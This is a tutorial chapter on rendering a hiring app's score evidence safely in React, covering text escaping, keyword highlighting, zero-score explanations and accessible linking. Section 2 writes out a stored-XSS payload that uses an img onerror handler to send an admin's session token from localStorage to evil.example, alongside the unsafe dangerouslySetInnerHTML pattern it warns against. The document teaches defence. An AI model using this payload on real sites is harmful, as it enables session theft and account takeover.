# Module 13, part 2 — The evidence beside each score

Every bar from part 1 carries the reason for its number: the question that
was scored, an excerpt of the answer with the **matching words
highlighted**, the engine's plain-English detail, and a link to the full
answer. A criterion that scored zero says *why*, in a sentence.

---

## Contents

| # | Topic | Code |
|---|---|---|
| [1](#1-how-react-escapes-text) | **How React escapes text** | [`score-breakdown.tsx:121`](../../web/src/components/score/score-breakdown.tsx#L121) |
| [2](#2-the-unsafe-version-and-the-attack) | **The unsafe version, and the attack** | — |
| [3](#3-highlighting-without-html) | **Highlighting without HTML** | [`highlight.ts:35`](../../web/src/lib/score/highlight.ts#L35) |
| [4](#4-which-words-get-highlighted) | Which words get highlighted | [`highlight.ts:13`](../../web/src/lib/score/highlight.ts#L13) |
| [5](#5-explaining-a-zero) | **Explaining a zero** | [`highlight.ts:60`](../../web/src/lib/score/highlight.ts#L60) |
| [6](#6-always-visible-not-collapsed) | Always visible, not collapsed | [`score-breakdown.tsx:107`](../../web/src/components/score/score-breakdown.tsx#L107) |
| [7](#7-the-link-to-the-full-answer) | The link to the full answer | [`application-detail.tsx:89`](../../web/src/components/applications/application-detail.tsx#L89) |
| [8](#8-verification) | Verification | — |

---

## 1. How React escapes text

**📍 Open:** [`web/src/components/score/score-breakdown.tsx:121`](../../web/src/components/score/score-breakdown.tsx#L121)

When JSX contains `{someString}`, React does not parse the string as HTML.
It creates a DOM **text node** (`document.createTextNode`) containing those
exact characters. A `<` in the string becomes a `<` character on screen,
never the start of a tag. There is no "escaping" step to forget, because
the string never goes through the HTML parser at all.

This is why the answer text — user input, typed by a candidate — is safe to
render as children: `{s.text}` inside `<mark>` or `<span>`.

## 2. The unsafe version, and the attack

The tempting way to highlight is to build HTML:

```tsx
// UNSAFE — do not write this
const html = excerpt.replace(/\b(go|gin)\b/gi, "<mark>$1</mark>");
return <blockquote dangerouslySetInnerHTML={{ __html: html }} />;
```

`dangerouslySetInnerHTML` hands the string to the browser's HTML parser,
exactly like `element.innerHTML = html`. Now the candidate controls markup
on the admin's page. The attack, step by step:

1. A candidate applies with this as their project description:
   `I built a Go API <img src=x onerror="fetch('https://evil.example/?t='+localStorage.getItem('hiredesk.session'))">`
2. The engine scores it; the excerpt keeps the `<img …>` text, because to
   the engine it is just characters.
3. An admin opens the candidate. The parser builds a real `<img>`, the
   image fails to load, and `onerror` runs **as the admin, on the HireDesk
   origin**.
4. The session (access and refresh tokens, which 11.2 keeps in
   `localStorage`) is sent to the attacker, who can now act as an admin:
   read every application, change statuses, assign interviewers.

This is stored XSS, and it is aimed at the most privileged user, by the
least trusted one, through the exact field the product exists to display.
The escape also cannot be "fixed" by stripping `<script>`: `onerror`,
`onload`, `javascript:` URLs and SVG all execute without one. The only
robust rule is never to let user text reach an HTML parser.

## 3. Highlighting without HTML

**📍 Open:** [`web/src/lib/score/highlight.ts:35`](../../web/src/lib/score/highlight.ts#L35)

`highlight(text, keywords)` returns **data**, not markup: an array of
`{ text, match }` segments. The component maps each to a `<mark>` or a
`<span>` with the segment as a text child. The answer is split, never
parsed.

Details worth knowing:

- **Keywords are escaped for the regexp**
  ([`escapeRegExp`](../../web/src/lib/score/highlight.ts#L24)), so `c++`
  matches the literal characters, not "one or more c".
- **Longest first** ([line 39](../../web/src/lib/score/highlight.ts#L39)):
  with `go` and `golang` both matched, alternation tries left to right, so
  `golang` must come first or "golang" would highlight only "go".
- **Whole words, Unicode-aware** ([line 42](../../web/src/lib/score/highlight.ts#L42)):
  lookbehind `(?<![…])` and lookahead `(?![…])` say "no word character on
  either side" without including the neighbours in the match. The word
  characters are `\p{L}\p{N}_` with the `u` flag — the same set the Go
  matcher uses in `internal/scoring/keyword.go` — so "café" and "Go" match
  the same way in both languages. (Go's RE2 has no lookaround; the server
  uses a capture group instead. JavaScript has lookbehind since ES2018.)
- `String.prototype.matchAll` with the `g` flag yields every match with its
  `index`, which is what lets the text between matches be kept.

## 4. Which words get highlighted

**📍 Open:** [`web/src/lib/score/highlight.ts:13`](../../web/src/lib/score/highlight.ts#L13)

Only the keywords the engine **reported as matched**, parsed from its
detail string ("matched 4 of 5 keywords: go, golang, goroutine, gin"). The
rejected alternative was fetching the rubric and highlighting every
configured keyword. That would show words that did *not* earn points
(the server's whole-word rule rejected them) and would need a second
request. The engine already said what counted; the UI repeats it.

Highlighting applies to `keyword_match` criteria only. For
`experience_years` or `answer_depth` there are no matching words to show,
and the excerpt is just the answer
([line 80](../../web/src/components/score/score-breakdown.tsx#L80)).

## 5. Explaining a zero

**📍 Open:** [`web/src/lib/score/highlight.ts:60`](../../web/src/lib/score/highlight.ts#L60)

This is the most important part of the component. The project's premise is
that every score is explainable — the `scores.detail` column is `NOT NULL`
for exactly this reason. A zero is the score an admin acts on (a reject)
and the one a candidate disputes, and a bare "0 of 30" looks like a bug:
did the candidate fail, or did the scorer break?

`zeroReason` turns the engine's detail into a sentence naming the cause:

| Engine detail | Shown |
|---|---|
| `no answer provided` | No answer was provided to the question this criterion scores. |
| `27 characters, at or below the minimum of 50` | Below the minimum: 27 characters, at or below the minimum of 50. |
| `matched 0 of 5 keywords` | None of the expected keywords appear in the answer (matched 0 of 5 keywords). |
| `could not read "lots" as a number of years` | The answer could not be read as a number: … |
| anything else | Scored zero: … (the raw detail, never nothing) |

It renders with an icon and the weak-band colour, in place of the plain
detail line ([`score-breakdown.tsx:107`](../../web/src/components/score/score-breakdown.tsx#L107)),
so a zero is impossible to miss *and* impossible to misread. The fallback
row matters: a detail string the client has never seen still produces a
sentence.

## 6. Always visible, not collapsed

What is the admin doing on this screen? Deciding whether to trust the number
before acting on it. The evidence is the check. Collapsed by default would
mean one click per criterion to do the one thing the screen is for, and
most admins would stop clicking after the first. Four criteria with an
~120-character excerpt each is short enough to show in full; the server
already trimmed each answer to the part that matters (07-3).

## 7. The link to the full answer

**📍 Open:** [`web/src/components/applications/application-detail.tsx:89`](../../web/src/components/applications/application-detail.tsx#L89)

"Read the full answer" is a real `href="#answer-<id>"` link, so it works
without JavaScript and can be opened or copied. On the detail page the
answers sit in a tab that may be closed — Base UI unmounts inactive panels —
so the click is intercepted: switch to the Answers tab, then
`requestAnimationFrame` waits one frame for React to render it before
scrolling the answer into view and moving focus to it. The answer row has
`tabIndex={-1}`: focusable from script, not added to the Tab order.

## 8. Verification

| Check | Result |
|---|---|
| Top candidate, Go knowledge criterion | "Go", "Gin", "goroutines" highlighted in the excerpt |
| A review whose notes contain `<script>alert(1)</script>` | Rendered as literal text, no dialog |
| Weak application: 0 years, 27-character answer, no keywords, `false` booleans | Each row shows its own sentence; none blank |
| "Read the full answer" with the Timeline tab open | Switches to Answers and scrolls to that answer |
